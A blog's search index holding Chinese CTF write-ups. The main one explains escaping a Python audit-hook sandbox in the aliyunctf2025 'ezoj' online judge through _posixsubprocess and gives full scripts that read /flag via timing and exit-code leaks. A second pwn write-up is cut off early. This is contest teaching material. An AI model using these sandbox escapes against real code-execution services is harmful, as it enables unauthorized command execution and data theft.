<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>aliyunctf2025 ezoj 非预期解与官方题解复现</title>
    <link href="/2025/02/26/aliyunctf2025-ezoj-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E5%AE%98%E6%96%B9%E9%A2%98%E8%A7%A3%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/02/26/aliyunctf2025-ezoj-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E5%AE%98%E6%96%B9%E9%A2%98%E8%A7%A3%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="ezoj"><a href="#ezoj" class="headerlink" title="ezoj"></a>ezoj</h1><p>这比赛的pwn全是kernel，我会不了一点，于是就去协助web手打web了。这题我们当时用的是时间盲注，后来发现官方题解更简单，所以复现并记录一下。</p><h4 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h4><p>网页最下面提示了源代码在&#x2F;source下，访问即可得到网页源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, send_file<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br>app = Flask(__name__)<br><br>SUBMISSIONS_PATH = Path(<span class="hljs-string">&quot;./submissions&quot;</span>)<br>PROBLEMS_PATH = Path(<span class="hljs-string">&quot;./problems&quot;</span>)<br><br>SUBMISSIONS_PATH.mkdir(parents=<span class="hljs-literal">True</span>, exist_ok=<span class="hljs-literal">True</span>)<br><br>CODE_TEMPLATE = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">import sys</span><br><span class="hljs-string">import math</span><br><span class="hljs-string">import collections</span><br><span class="hljs-string">import queue</span><br><span class="hljs-string">import heapq</span><br><span class="hljs-string">import bisect</span><br><span class="hljs-string"></span><br><span class="hljs-string">def audit_checker(event,args):</span><br><span class="hljs-string">    if not event in [&quot;import&quot;,&quot;time.sleep&quot;,&quot;builtins.input&quot;,&quot;builtins.input/result&quot;]:</span><br><span class="hljs-string">        raise RuntimeError</span><br><span class="hljs-string"></span><br><span class="hljs-string">sys.addaudithook(audit_checker)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OJTimeLimitExceed</span>(<span class="hljs-title class_ inherited__">Exception</span>):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OJRuntimeError</span>(<span class="hljs-title class_ inherited__">Exception</span>):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&quot;static/index.html&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/source&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&quot;server.py&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/api/problems&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_problems</span>():<br>    problems_dir = PROBLEMS_PATH<br>    problems = []<br>    <span class="hljs-keyword">for</span> problem <span class="hljs-keyword">in</span> problems_dir.iterdir():<br>        problem_config_file = problem / <span class="hljs-string">&quot;problem.json&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> problem_config_file.exists():<br>            <span class="hljs-keyword">continue</span><br><br>        problem_config = json.load(problem_config_file.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r&quot;</span>))<br>        problem = &#123;<br>            <span class="hljs-string">&quot;problem_id&quot;</span>: problem.name,<br>            <span class="hljs-string">&quot;name&quot;</span>: problem_config[<span class="hljs-string">&quot;name&quot;</span>],<br>            <span class="hljs-string">&quot;description&quot;</span>: problem_config[<span class="hljs-string">&quot;description&quot;</span>],<br>        &#125;<br>        problems.append(problem)<br><br>    problems = <span class="hljs-built_in">sorted</span>(problems, key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">&quot;problem_id&quot;</span>])<br><br>    problems = &#123;<span class="hljs-string">&quot;problems&quot;</span>: problems&#125;<br>    <span class="hljs-keyword">return</span> jsonify(problems), <span class="hljs-number">200</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/api/submit&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit_code</span>():<br>    <span class="hljs-keyword">try</span>:<br>        data = request.get_json()<br>        code = data.get(<span class="hljs-string">&quot;code&quot;</span>)<br>        problem_id = data.get(<span class="hljs-string">&quot;problem_id&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> code <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> problem_id <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> (<br>                jsonify(&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;ER&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Missing &#x27;code&#x27; or &#x27;problem_id&#x27;&quot;</span>&#125;),<br>                <span class="hljs-number">400</span>,<br>            )<br><br>        problem_id = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(problem_id))<br>        problem_dir = PROBLEMS_PATH / problem_id<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> problem_dir.exists():<br>            <span class="hljs-keyword">return</span> (<br>                jsonify(<br>                    &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;ER&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;Problem ID <span class="hljs-subst">&#123;problem_id&#125;</span> not found!&quot;</span>&#125;<br>                ),<br>                <span class="hljs-number">404</span>,<br>            )<br><br>        code_filename = SUBMISSIONS_PATH / <span class="hljs-string">f&quot;submission_<span class="hljs-subst">&#123;uuid.uuid4()&#125;</span>.py&quot;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(code_filename, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> code_file:<br>            code = CODE_TEMPLATE + code<br>            code_file.write(code)<br><br>        result = judge(code_filename, problem_dir)<br><br>        code_filename.unlink()<br><br>        <span class="hljs-keyword">return</span> jsonify(result)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;ER&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">judge</span>(<span class="hljs-params">code_filename, problem_dir</span>):<br>    test_files = <span class="hljs-built_in">sorted</span>(problem_dir.glob(<span class="hljs-string">&quot;*.input&quot;</span>))<br>    total_tests = <span class="hljs-built_in">len</span>(test_files)<br>    passed_tests = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">for</span> test_file <span class="hljs-keyword">in</span> test_files:<br>            input_file = test_file<br>            expected_output_file = problem_dir / <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;test_file.stem&#125;</span>.output&quot;</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> expected_output_file.exists():<br>                <span class="hljs-keyword">continue</span><br><br>            case_passed = run_code(code_filename, input_file, expected_output_file)<br><br>            <span class="hljs-keyword">if</span> case_passed:<br>                passed_tests += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> passed_tests == total_tests:<br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;AC&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;Accepted&quot;</span>&#125;<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;WA&quot;</span>,<br>                <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;Wrang Answer: pass(<span class="hljs-subst">&#123;passed_tests&#125;</span>/<span class="hljs-subst">&#123;total_tests&#125;</span>)&quot;</span>,<br>            &#125;<br>    <span class="hljs-keyword">except</span> OJRuntimeError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;RE&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;Runtime Error: ret=<span class="hljs-subst">&#123;e.args[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>&#125;<br>    <span class="hljs-keyword">except</span> OJTimeLimitExceed:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;TLE&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Time Limit Exceed&quot;</span>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_code</span>(<span class="hljs-params">code_filename, input_file, expected_output_file</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> infile, <span class="hljs-built_in">open</span>(<br>        expected_output_file, <span class="hljs-string">&quot;r&quot;</span><br>    ) <span class="hljs-keyword">as</span> expected_output:<br>        expected_output_content = expected_output.read().strip()<br><br>        process = subprocess.Popen(<br>            [<span class="hljs-string">&quot;python3&quot;</span>, code_filename],<br>            stdin=infile,<br>            stdout=subprocess.PIPE,<br>            stderr=subprocess.PIPE,<br>            text=<span class="hljs-literal">True</span>,<br>        )<br><br>        <span class="hljs-keyword">try</span>:<br>            stdout, stderr = process.communicate(timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">except</span> subprocess.TimeoutExpired:<br>            process.kill()<br>            <span class="hljs-keyword">raise</span> OJTimeLimitExceed<br><br>        <span class="hljs-keyword">if</span> process.returncode != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">raise</span> OJRuntimeError(process.returncode)<br><br>        <span class="hljs-keyword">if</span> stdout.strip() == expected_output_content:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>通过分析源码和抓包可以看出：</p><ol><li>程序通过<code>/api/submit</code>接收一个POST请求，执行请求中的代码</li><li>代码被拼接到<code>CODE_TEMPLATE</code>后执行，并且有白名单沙箱限制调用</li></ol><p>这里考虑沙箱逃逸。Python中有比题给的沙箱更底层的调用<code>_posixsubprocess</code>，它不会被监控，可以尝试用它执行命令。</p><h4 id="非预期解-时间盲注"><a href="#非预期解-时间盲注" class="headerlink" title="非预期解(时间盲注)"></a>非预期解(时间盲注)</h4><p>网上很容易查到<code>_posixsubprocess</code>执行任意命令的板子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> _posixsubprocess<br>cmd = <span class="hljs-string">b&#x27;&#x27;</span><br>_posixsubprocess.fork_exec([<span class="hljs-string">b&quot;/bin/sh&quot;</span>,  <span class="hljs-string">b&quot;-c&quot;</span> , cmd], [<span class="hljs-string">b&quot;/bin/sh&quot;</span>], <span class="hljs-literal">True</span>, (), <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, *(os.pipe()), <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>现在的问题是，程序没有回显，且不出网无法反弹shell。我们要想办法搞出命令的回显才行。我们在比赛时的第一反应是<strong>时间盲注</strong>。<br>时间盲注的大概原理是，用一个合适大小的字符集匹配某个字节流中的字符，若匹配不成功则pass，匹配成功则让程序停止(sleep)一段时间再相应，那么通过相应时间就可以推断字节流的内容，拿到flag。这实际上就是<strong>将时间解释为输出</strong>的方法。<br>知道原理之后就好写脚本了。这个脚本应该还能优化成二分查找，但我们比较懒，没优化()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&quot;http://121.41.238.106:29330/api/submit&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;problem_id&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<br>    <span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;import os\nimport _posixsubprocess\n\n_posixsubprocess.fork_exec([b\&quot;/bin/sh\&quot;,  b\&quot;-c\&quot; , b\&quot;\&quot;\&quot;chr=$(cat /flag* | cut -c&#123;j&#125;)\nif [ \&quot;$chr\&quot; = \&quot;&#123;index&#125;\&quot; ]; then\t\nsleep 0.3\nfi\&quot;\&quot;\&quot;], [b\&quot;/bin/sh\&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), 2, False,False, None, None, None, -1, None, False)&quot;</span><br>&#125;<br><br>result = <span class="hljs-string">&quot;&quot;</span><br>charset = <span class="hljs-string">&quot;abcdef-&#123;&#125;liyunt0123456789&quot;</span><br><span class="hljs-built_in">print</span>(charset)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">60</span>):<br>    getit = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(charset)):      <br>        data1 = data.copy()<br>        data1[<span class="hljs-string">&quot;code&quot;</span>] = data[<span class="hljs-string">&quot;code&quot;</span>].<span class="hljs-built_in">format</span>(j=j,index=charset[i])<br>        start_time = time.monotonic()<br>        res = requests.post(url=url,json=data1)<br><br>        <span class="hljs-comment"># print(f&quot;now&gt;&gt;&gt;&#123;j&#125;::&#123;charset[i]&#125;&quot;, f&quot;time=&#123;time.monotonic() - start_time&#125;&quot;)</span><br>        <br>        <span class="hljs-keyword">if</span> time.monotonic() - start_time &gt; <span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">if</span> getit:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;j&#125;</span>::<span class="hljs-subst">&#123;charset[i]&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">continue</span><br>            result += charset[i]<br>            <span class="hljs-built_in">print</span>(result)<br>            getit = <span class="hljs-literal">True</span><br>            <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> getit:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;&gt;&gt; <span class="hljs-subst">&#123;j&#125;</span> is failed&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="预期解复现"><a href="#预期解复现" class="headerlink" title="预期解复现"></a>预期解复现</h4><p>参考官方题解：<a href="https://xz.aliyun.com/news/17029">https://xz.aliyun.com/news/17029</a><br>官方题解用另一种方法解决了回显问题。当提交的代码运行失败或异常退出时，网页会回显<strong>退出码</strong>。而退出码恰好是0~255，即一个字节。<br><img src="/./aliyunctf2025-ezoj-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E5%AE%98%E6%96%B9%E9%A2%98%E8%A7%A3%E5%A4%8D%E7%8E%B0/image.png" alt="alt text"><br>那么现在的问题就是，<code>_posixsubprocess</code>执行命令时显然是exec了一个子进程执行，执行命令的输出是子进程的<code>stdout</code>，我们怎么在父进程获取这个输出呢？<br>这就需要看一下<code>_posixsubprocess</code>的细节用法了。网上几乎查不到相关接口，我们只能去看源码了。源码：<a href="https://github.com/python/cpython.git">https://github.com/python/cpython.git</a><br>在源码的&#x2F;Modules文件夹下的<code>_posixsubprocess.c</code>我们可以看到这个函数的源码。它进行了多层预处理，最终调用<code>child_exec</code>函数执行exec。注意722行的这些代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (c2pwrite == <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-keyword">if</span> (_Py_set_inheritable_async_safe(c2pwrite, <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">goto</span> error;<br>    &#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c2pwrite != <span class="hljs-number">-1</span>)<br>    POSIX_CALL(dup2(c2pwrite, <span class="hljs-number">1</span>));  <span class="hljs-comment">/* stdout */</span><br></code></pre></td></tr></table></figure><p>这会把子进程的<code>stdout</code>转发到<code>c2pwrite</code>上。这样，我们就可以通过<code>c2pwrite</code>参数获取子进程的输出并通过退出码逐步输出。<br>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><br>URL = <span class="hljs-string">&quot;http://121.41.238.106:42312//api/submit&quot;</span><br>CODE_TEMPLATE = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">import _posixsubprocess</span><br><span class="hljs-string">import os</span><br><span class="hljs-string">import time</span><br><span class="hljs-string">import sys</span><br><span class="hljs-string"></span><br><span class="hljs-string">std_pipe = os.pipe()</span><br><span class="hljs-string">err_pipe = os.pipe()</span><br><span class="hljs-string"></span><br><span class="hljs-string">_posixsubprocess.fork_exec(</span><br><span class="hljs-string">    (b&quot;/bin/bash&quot;,b&quot;-c&quot;,b&quot;&#123;command&#125;&quot;),</span><br><span class="hljs-string">    [b&quot;/bin/bash&quot;],</span><br><span class="hljs-string">    True,</span><br><span class="hljs-string">    (),</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    std_pipe[1], #c2pwrite</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    *(err_pipe),</span><br><span class="hljs-string">    False,</span><br><span class="hljs-string">    False,</span><br><span class="hljs-string">    False,</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    False,</span><br><span class="hljs-string">)</span><br><span class="hljs-string">time.sleep(0.1)</span><br><span class="hljs-string">content = os.read(std_pipe[0],1024)</span><br><span class="hljs-string">content_len = len(content)</span><br><span class="hljs-string"></span><br><span class="hljs-string">if &#123;loc&#125; &lt; content_len:</span><br><span class="hljs-string">    sys.exit(content[&#123;loc&#125;])</span><br><span class="hljs-string">else:</span><br><span class="hljs-string">    sys.exit(255)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>command=<span class="hljs-string">&quot;cat /flag*&quot;</span><br>received = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">254</span>):<br>    code = CODE_TEMPLATE.<span class="hljs-built_in">format</span>(loc=i,command=command)<br>    data = &#123;<span class="hljs-string">&quot;problem_id&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;code&quot;</span>:code&#125;<br>    resp = requests.post(URL,json=data)<br>    resp_data = resp.json()<br>    <span class="hljs-keyword">assert</span>(resp_data[<span class="hljs-string">&quot;status&quot;</span>] == <span class="hljs-string">&quot;RE&quot;</span>)<br>    ret_loc = resp_data[<span class="hljs-string">&quot;message&quot;</span>].find(<span class="hljs-string">&quot;ret=&quot;</span>)<br>    ret_code = resp_data[<span class="hljs-string">&quot;message&quot;</span>][ret_loc+<span class="hljs-number">4</span>:]<br>    <span class="hljs-keyword">if</span> ret_code == <span class="hljs-string">&quot;255&quot;</span>:<br>        <span class="hljs-keyword">break</span><br>    received += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(ret_code))<br>    <span class="hljs-built_in">print</span>(received)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>春秋杯2024冬季赛 pwn-wp</title>
    <link href="/2025/02/26/%E6%98%A5%E7%A7%8B%E6%9D%AF2024%E5%86%AC%E5%AD%A3%E8%B5%9B-pwn-wp/"/>
    <url>/2025/02/26/%E6%98%A5%E7%A7%8B%E6%9D%AF2024%E5%86%AC%E5%AD%A3%E8%B5%9B-pwn-wp/</url>
    
    <content type="html"><![CDATA[<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>首先在本地环境调试时需要拟造一个.BYPASS文件，只要满足条件即可。<br><code>main</code>函数可以leak puts, 进而leak libc。<code>0x400978</code>处的函数可以栈溢出，但由于见0截断，只能用one_gadget打。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td 